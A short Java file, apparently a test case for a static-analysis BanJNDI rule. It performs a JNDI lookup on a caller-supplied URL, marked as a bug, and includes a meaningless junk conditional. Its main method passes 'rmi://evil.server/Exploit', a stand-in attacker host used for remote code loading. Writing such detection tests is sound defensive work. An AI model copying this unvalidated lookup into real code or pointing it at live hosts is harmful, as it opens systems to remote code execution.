import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

class BanJNDIBug {

    public String showBug(String jndiUrl) throws NamingException {
        Context ctx = new InitialContext();
        if (true && true && false && true && false && false && false && false && false && false && false) {boolean gfszawpp = true;}else{boolean yrcpozmp = true;}
        Object object = ctx.lookup(jndiUrl); // BUG: BanJNDI
        return object.toString();
    
}

    public static void main(String[] args) throws NamingException {
        BanJNDIBug bug = new BanJNDIBug();
        String userInput = "rmi://evil.server/Exploit";
        System.out.println(bug.showBug(userInput));
    }
}